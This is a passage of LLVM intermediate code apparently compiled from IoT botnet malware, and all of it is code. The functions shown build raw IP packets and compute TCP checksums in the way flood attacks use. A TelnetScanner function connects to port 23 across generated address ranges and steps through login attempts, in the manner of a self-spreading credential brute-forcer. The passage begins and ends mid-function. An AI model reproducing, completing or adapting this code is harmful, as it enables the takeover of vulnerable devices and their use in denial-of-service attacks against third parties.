  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #10
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #5
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #5
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #2

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = and i8 %13, -16
  %15 = or i8 %14, 5
  store i8 %15, i8* %12, align 4
  %16 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %17 = bitcast %struct.iphdr* %16 to i8*
  %18 = load i8, i8* %17, align 4
  %19 = and i8 %18, 15
  %20 = or i8 %19, 64
  store i8 %20, i8* %17, align 4
  %21 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 1
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = add i64 20, %24
  %26 = trunc i64 %25 to i16
  %27 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 2
  store i16 %26, i16* %28, align 2
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %31, i32 0, i32 3
  store i16 %30, i16* %32, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 4
  store i16 0, i16* %34, align 2
  %35 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 5
  store i8 -1, i8* %36, align 4
  %37 = load i8, i8* %9, align 1
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 6
  store i8 %37, i8* %39, align 1
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 7
  store i16 0, i16* %41, align 2
  %42 = load i32, i32* %8, align 4
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 8
  store i32 %42, i32* %44, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 9
  store i32 %45, i32* %47, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  %5 = icmp sgt i32 3, %4
  br i1 %5, label %6, label %7

; <label>:6:                                      ; preds = %1
  store i32 1, i32* %2, align 4
  br label %10

; <label>:7:                                      ; preds = %1
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* %2, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %6
  %11 = load i32, i32* %2, align 4
  ret i32 %11
}

; Function Attrs: noinline nounwind uwtable
define void @TelnetScanner(i32, i32) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [128 x i8], align 16
  %11 = alloca i8, align 1
  %12 = alloca %struct.fd_set, align 8
  %13 = alloca %struct.timeval, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [256 x i8], align 16
  %17 = alloca i8*, align 8
  %18 = alloca %struct.sockaddr_in, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca [80 x i8], align 16
  store i32 %0, i32* %3, align 4
  store i32 %1, i32* %4, align 4
  %24 = call i32 @getdtablesize() #5
  %25 = sub nsw i32 %24, 100
  store i32 %25, i32* %5, align 4
  %26 = load i32, i32* %5, align 4
  %27 = load i32, i32* %4, align 4
  %28 = icmp sgt i32 %26, %27
  br i1 %28, label %29, label %31

; <label>:29:                                     ; preds = %2
  %30 = load i32, i32* %4, align 4
  store i32 %30, i32* %5, align 4
  br label %31

; <label>:31:                                     ; preds = %29, %2
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %32, align 4
  %33 = call zeroext i16 @htons(i16 zeroext 23) #10
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %36 = getelementptr inbounds [8 x i8], [8 x i8]* %35, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %36, i8 0, i64 8, i32 4, i1 false)
  %37 = call noalias i8* @malloc(i64 1025) #5
  store i8* %37, i8** %17, align 8
  %38 = load i8*, i8** %17, align 8
  call void @llvm.memset.p0i8.i64(i8* %38, i8 0, i64 1025, i32 1, i1 false)
  %39 = load i32, i32* %5, align 4
  %40 = zext i32 %39 to i64
  %41 = call i8* @llvm.stacksave()
  store i8* %41, i8** %19, align 8
  %42 = alloca %struct.telstate_t, i64 %40, align 16
  %43 = bitcast %struct.telstate_t* %42 to i8*
  %44 = load i32, i32* %5, align 4
  %45 = sext i32 %44 to i64
  %46 = mul i64 %45, 5
  call void @llvm.memset.p0i8.i64(i8* %43, i8 0, i64 %46, i32 16, i1 false)
  store i32 0, i32* %6, align 4
  br label %47

; <label>:47:                                     ; preds = %65, %31
  %48 = load i32, i32* %6, align 4
  %49 = load i32, i32* %5, align 4
  %50 = icmp slt i32 %48, %49
  br i1 %50, label %51, label %68

; <label>:51:                                     ; preds = %47
  %52 = load i32, i32* %6, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %53
  %55 = bitcast %struct.telstate_t* %54 to i8*
  call void @llvm.memset.p0i8.i64(i8* %55, i8 0, i64 32, i32 16, i1 false)
  %56 = load i32, i32* %6, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %57
  %59 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %58, i32 0, i32 3
  store i8 1, i8* %59, align 1
  %60 = load i8*, i8** %17, align 8
  %61 = load i32, i32* %6, align 4
  %62 = sext i32 %61 to i64
  %63 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %62
  %64 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %63, i32 0, i32 9
  store i8* %60, i8** %64, align 8
  br label %65

; <label>:65:                                     ; preds = %51
  %66 = load i32, i32* %6, align 4
  %67 = add nsw i32 %66, 1
  store i32 %67, i32* %6, align 4
  br label %47

; <label>:68:                                     ; preds = %47
  br label %69

; <label>:69:                                     ; preds = %840, %68
  br label %70

; <label>:70:                                     ; preds = %69
  store i32 0, i32* %6, align 4
  br label %71

; <label>:71:                                     ; preds = %837, %70
  %72 = load i32, i32* %6, align 4
  %73 = load i32, i32* %5, align 4
  %74 = icmp slt i32 %72, %73
  br i1 %74, label %75, label %840

; <label>:75:                                     ; preds = %71
  %76 = load i32, i32* %6, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %77
  %79 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %78, i32 0, i32 7
  %80 = load i32, i32* %79, align 16
  %81 = icmp eq i32 %80, 0
  br i1 %81, label %82, label %89

; <label>:82:                                     ; preds = %75
  %83 = call i64 @time(i64* null) #5
  %84 = trunc i64 %83 to i32
  %85 = load i32, i32* %6, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %86
  %88 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %87, i32 0, i32 7
  store i32 %84, i32* %88, align 16
  br label %89

; <label>:89:                                     ; preds = %82, %75
  %90 = load i32, i32* %6, align 4
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %91
  %93 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %92, i32 0, i32 2
  %94 = load i8, i8* %93, align 8
  %95 = zext i8 %94 to i32
  switch i32 %95, label %836 [
    i32 0, label %96
    i32 1, label %232
    i32 2, label %337
    i32 3, label %389
    i32 4, label %434
    i32 5, label %486
    i32 6, label %531
    i32 7, label %631
    i32 8, label %675
  ]

; <label>:96:                                     ; preds = %89
  %97 = load i32, i32* %6, align 4
  %98 = sext i32 %97 to i64
  %99 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %98
  %100 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %99, i32 0, i32 3
  %101 = load i8, i8* %100, align 1
  %102 = zext i8 %101 to i32
  %103 = icmp eq i32 %102, 1
  br i1 %103, label %104, label %124

; <label>:104:                                    ; preds = %96
  %105 = load i32, i32* %6, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %106
  %108 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %107, i32 0, i32 9
  %109 = load i8*, i8** %108, align 8
  store i8* %109, i8** %20, align 8
  %110 = load i32, i32* %6, align 4
  %111 = sext i32 %110 to i64
  %112 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %111
  %113 = bitcast %struct.telstate_t* %112 to i8*
  call void @llvm.memset.p0i8.i64(i8* %113, i8 0, i64 32, i32 16, i1 false)
  %114 = load i8*, i8** %20, align 8
  %115 = load i32, i32* %6, align 4
  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %116
  %118 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %117, i32 0, i32 9
  store i8* %114, i8** %118, align 8
  %119 = call i32 @TelnetIPRanges()
  %120 = load i32, i32* %6, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %121
  %123 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %122, i32 0, i32 1
  store i32 %119, i32* %123, align 4
  br label %172

; <label>:124:                                    ; preds = %96
  %125 = load i32, i32* %6, align 4
  %126 = sext i32 %125 to i64
  %127 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %126
  %128 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %127, i32 0, i32 3
  %129 = load i8, i8* %128, align 1
  %130 = zext i8 %129 to i32
  %131 = icmp eq i32 %130, 0
  br i1 %131, label %132, label %171

; <label>:132:                                    ; preds = %124
  %133 = load i32, i32* %6, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %134
  %136 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %135, i32 0, i32 4
  %137 = load i8, i8* %136, align 2
  %138 = add i8 %137, 1
  store i8 %138, i8* %136, align 2
  %139 = load i32, i32* %6, align 4
  %140 = sext i32 %139 to i64
  %141 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %140
  %142 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %141, i32 0, i32 5
  %143 = load i8, i8* %142, align 1
  %144 = add i8 %143, 1
  store i8 %144, i8* %142, align 1
  %145 = load i32, i32* %6, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %146
  %148 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %147, i32 0, i32 5
  %149 = load i8, i8* %148, align 1
  %150 = zext i8 %149 to i64
  %151 = icmp eq i64 %150, 6
  br i1 %151, label %152, label %157

; <label>:152:                                    ; preds = %132
  %153 = load i32, i32* %6, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %154
  %156 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %155, i32 0, i32 3
  store i8 1, i8* %156, align 1
  br label %157

; <label>:157:                                    ; preds = %152, %132
  %158 = load i32, i32* %6, align 4
  %159 = sext i32 %158 to i64
  %160 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %159
  %161 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %160, i32 0, i32 4
  %162 = load i8, i8* %161, align 2
  %163 = zext i8 %162 to i64
  %164 = icmp eq i64 %163, 6
  br i1 %164, label %165, label %170

; <label>:165:                                    ; preds = %157
  %166 = load i32, i32* %6, align 4
  %167 = sext i32 %166 to i64
  %168 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %167
  %169 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %168, i32 0, i32 3
  store i8 1, i8* %169, align 1
  br label %837

; <label>:170:                                    ; preds = %157
  br label %171

; <label>:171:                                    ; preds = %170, %124
  br label %172

; <label>:172:                                    ; preds = %171, %104
  %173 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %173, align 4
  %174 = call zeroext i16 @htons(i16 zeroext 23) #10
  %175 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %174, i16* %175, align 2
  %176 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %177 = getelementptr inbounds [8 x i8], [8 x i8]* %176, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %177, i8 0, i64 8, i32 4, i1 false)
  %178 = load i32, i32* %6, align 4
  %179 = sext i32 %178 to i64
  %180 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %179
  %181 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %180, i32 0, i32 1
  %182 = load i32, i32* %181, align 4
  %183 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  %184 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %183, i32 0, i32 0
  store i32 %182, i32* %184, align 4
  %185 = call i32 @socket(i32 2, i32 1, i32 0) #5
  %186 = load i32, i32* %6, align 4
  %187 = sext i32 %186 to i64
  %188 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %187
  %189 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %188, i32 0, i32 0
  store i32 %185, i32* %189, align 16
  %190 = load i32, i32* %6, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %191
  %193 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %192, i32 0, i32 0
  %194 = load i32, i32* %193, align 16
  %195 = icmp eq i32 %194, -1
  br i1 %195, label %196, label %197

; <label>:196:                                    ; preds = %172
  br label %837

; <label>:197:                                    ; preds = %172
  %198 = load i32, i32* %6, align 4
  %199 = sext i32 %198 to i64
  %200 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %199
  %201 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %200, i32 0, i32 0
  %202 = load i32, i32* %201, align 16
  %203 = load i32, i32* %6, align 4
  %204 = sext i32 %203 to i64
  %205 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %204
  %206 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %205, i32 0, i32 0
  %207 = load i32, i32* %206, align 16
  %208 = call i32 (i32, i32, ...) @fcntl(i32 %207, i32 3, i8* null)
  %209 = or i32 %208, 2048
  %210 = call i32 (i32, i32, ...) @fcntl(i32 %202, i32 4, i32 %209)
  %211 = load i32, i32* %6, align 4
  %212 = sext i32 %211 to i64
  %213 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %212
  %214 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %213, i32 0, i32 0
  %215 = load i32, i32* %214, align 16
  %216 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  %217 = call i32 @connect(i32 %215, %struct.sockaddr* %216, i32 16)
  %218 = icmp eq i32 %217, -1
  br i1 %218, label %219, label %227

; <label>:219:                                    ; preds = %197
  %220 = call i32* @__errno_location() #10
  %221 = load i32, i32* %220, align 4
  %222 = icmp ne i32 %221, 115
  br i1 %222, label %223, label %227

; <label>:223:                                    ; preds = %219
  %224 = load i32, i32* %6, align 4
  %225 = sext i32 %224 to i64
  %226 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %225
  call void @reset_telstate(%struct.telstate_t* %226)
  br label %231

; <label>:227:                                    ; preds = %219, %197
  %228 = load i32, i32* %6, align 4
  %229 = sext i32 %228 to i64
  %230 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %229
  call void @advance_telstate(%struct.telstate_t* %230, i32 1)
  br label %231

; <label>:231:                                    ; preds = %227, %223
  br label %836

; <label>:232:                                    ; preds = %89
  br label %233

; <label>:233:                                    ; preds = %232
  %234 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %235 = getelementptr inbounds [16 x i64], [16 x i64]* %234, i64 0, i64 0
  %236 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %235) #5, !srcloc !5
  %237 = extractvalue { i64, i64* } %236, 0
  %238 = extractvalue { i64, i64* } %236, 1
  %239 = trunc i64 %237 to i32
  store i32 %239, i32* %21, align 4
  %240 = ptrtoint i64* %238 to i64
  %241 = trunc i64 %240 to i32
  store i32 %241, i32* %22, align 4
  br label %242

; <label>:242:                                    ; preds = %233
  br label %243

; <label>:243:                                    ; preds = %242
  %244 = load i32, i32* %6, align 4
  %245 = sext i32 %244 to i64
  %246 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %245
  %247 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %246, i32 0, i32 0
  %248 = load i32, i32* %247, align 16
  %249 = srem i32 %248, 64
  %250 = zext i32 %249 to i64
  %251 = shl i64 1, %250
  %252 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %253 = load i32, i32* %6, align 4
  %254 = sext i32 %253 to i64
  %255 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %254
  %256 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %255, i32 0, i32 0
  %257 = load i32, i32* %256, align 16
  %258 = sdiv i32 %257, 64
  %259 = sext i32 %258 to i64
  %260 = getelementptr inbounds [16 x i64], [16 x i64]* %252, i64 0, i64 %259
  %261 = load i64, i64* %260, align 8
  %262 = or i64 %261, %251
  store i64 %262, i64* %260, align 8
  %263 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %263, align 8
  %264 = load i32, i32* %3, align 4
  %265 = sext i32 %264 to i64
  %266 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 %265, i64* %266, align 8
  %267 = load i32, i32* %6, align 4
  %268 = sext i32 %267 to i64
  %269 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %268
  %270 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %269, i32 0, i32 0
  %271 = load i32, i32* %270, align 16
  %272 = add nsw i32 %271, 1
  %273 = call i32 @select(i32 %272, %struct.fd_set* null, %struct.fd_set* %12, %struct.fd_set* null, %struct.timeval* %13)
  store i32 %273, i32* %7, align 4
  %274 = load i32, i32* %7, align 4
  %275 = icmp eq i32 %274, 1
  br i1 %275, label %276, label %314

; <label>:276:                                    ; preds = %243
  %277 = call i64 @time(i64* null) #5
  %278 = trunc i64 %277 to i32
  %279 = load i32, i32* %6, align 4
  %280 = sext i32 %279 to i64
  %281 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %280
  %282 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %281, i32 0, i32 7
  store i32 %278, i32* %282, align 16
  store i32 4, i32* %14, align 4
  store i32 0, i32* %15, align 4
  %283 = load i32, i32* %6, align 4
  %284 = sext i32 %283 to i64
  %285 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %284
  %286 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %285, i32 0, i32 0
  %287 = load i32, i32* %286, align 16
  %288 = bitcast i32* %15 to i8*
  %289 = call i32 @getsockopt(i32 %287, i32 1, i32 4, i8* %288, i32* %14) #5
  %290 = load i32, i32* %15, align 4
  %291 = icmp ne i32 %290, 0
  br i1 %291, label %292, label %296

; <label>:292:                                    ; preds = %276
  %293 = load i32, i32* %6, align 4
  %294 = sext i32 %293 to i64
  %295 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %294
  call void @reset_telstate(%struct.telstate_t* %295)
  br label %313

; <label>:296:                                    ; preds = %276
  %297 = load i32, i32* %6, align 4
  %298 = sext i32 %297 to i64
  %299 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %298
  %300 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %299, i32 0, i32 0
  %301 = load i32, i32* %300, align 16
  %302 = load i32, i32* %6, align 4
  %303 = sext i32 %302 to i64
  %304 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %303
  %305 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %304, i32 0, i32 0
  %306 = load i32, i32* %305, align 16
  %307 = call i32 (i32, i32, ...) @fcntl(i32 %306, i32 3, i8* null)
  %308 = and i32 %307, -2049
  %309 = call i32 (i32, i32, ...) @fcntl(i32 %301, i32 4, i32 %308)
  %310 = load i32, i32* %6, align 4
  %311 = sext i32 %310 to i64
  %312 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %311
  call void @advance_telstate(%struct.telstate_t* %312, i32 2)
  br label %313

; <label>:313:                                    ; preds = %296, %292
  br label %837

; <label>:314:                                    ; preds = %243
  %315 = load i32, i32* %7, align 4
  %316 = icmp eq i32 %315, -1
  br i1 %316, label %317, label %321

; <label>:317:                                    ; preds = %314
  %318 = load i32, i32* %6, align 4
  %319 = sext i32 %318 to i64
  %320 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %319
  call void @reset_telstate(%struct.telstate_t* %320)
  br label %837

; <label>:321:                                    ; preds = %314
  br label %322

; <label>:322:                                    ; preds = %321
  %323 = load i32, i32* %6, align 4
  %324 = sext i32 %323 to i64
  %325 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %324
  %326 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %325, i32 0, i32 7
  %327 = load i32, i32* %326, align 16
  %328 = add i32 %327, 7
  %329 = zext i32 %328 to i64
  %330 = call i64 @time(i64* null) #5
  %331 = icmp slt i64 %329, %330
  br i1 %331, label %332, label %336

; <label>:332:                                    ; preds = %322
  %333 = load i32, i32* %6, align 4
  %334 = sext i32 %333 to i64
  %335 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %334
  call void @reset_telstate(%struct.telstate_t* %335)
  br label %336

; <label>:336:                                    ; preds = %332, %322
  br label %836

; <label>:337:                                    ; preds = %89
  %338 = load i32, i32* %6, align 4
  %339 = sext i32 %338 to i64
  %340 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %339
  %341 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %340, i32 0, i32 0
  %342 = load i32, i32* %341, align 16
  %343 = load i32, i32* %3, align 4
  %344 = load i32, i32* %6, align 4
  %345 = sext i32 %344 to i64
  %346 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %345
  %347 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %346, i32 0, i32 9
  %348 = load i8*, i8** %347, align 8
  %349 = call i32 @read_until_response(i32 %342, i32 %343, i8* %348, i32 1024, i8** getelementptr inbounds ([16 x i8*], [16 x i8*]* @advances, i32 0, i32 0))
  %350 = icmp ne i32 %349, 0
  br i1 %350, label %351, label %374

; <label>:351:                                    ; preds = %337
  %352 = call i64 @time(i64* null) #5
  %353 = trunc i64 %352 to i32
  %354 = load i32, i32* %6, align 4
  %355 = sext i32 %354 to i64
  %356 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %355
  %357 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %356, i32 0, i32 7
  store i32 %353, i32* %357, align 16
  %358 = load i32, i32* %6, align 4
  %359 = sext i32 %358 to i64
  %360 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %359
  %361 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %360, i32 0, i32 9
  %362 = load i8*, i8** %361, align 8
  %363 = call i32 @contains_fail(i8* %362)
  %364 = icmp ne i32 %363, 0
  br i1 %364, label %365, label %369

; <label>:365:                                    ; preds = %351
  %366 = load i32, i32* %6, align 4
  %367 = sext i32 %366 to i64
  %368 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %367
  call void @advance_telstate(%struct.telstate_t* %368, i32 0)
  br label %373

; <label>:369:                                    ; preds = %351
  %370 = load i32, i32* %6, align 4
  %371 = sext i32 %370 to i64
  %372 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %371
  call void @advance_telstate(%struct.telstate_t* %372, i32 3)
  br label %373

; <label>:373:                                    ; preds = %369, %365
  br label %837

; <label>:374:                                    ; preds = %337
  %375 = load i32, i32* %6, align 4
  %376 = sext i32 %375 to i64
  %377 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %376
  %378 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %377, i32 0, i32 7
  %379 = load i32, i32* %378, align 16
  %380 = add i32 %379, 7
  %381 = zext i32 %380 to i64
  %382 = call i64 @time(i64* null) #5
  %383 = icmp slt i64 %381, %382
  br i1 %383, label %384, label %388

; <label>:384:                                    ; preds = %374
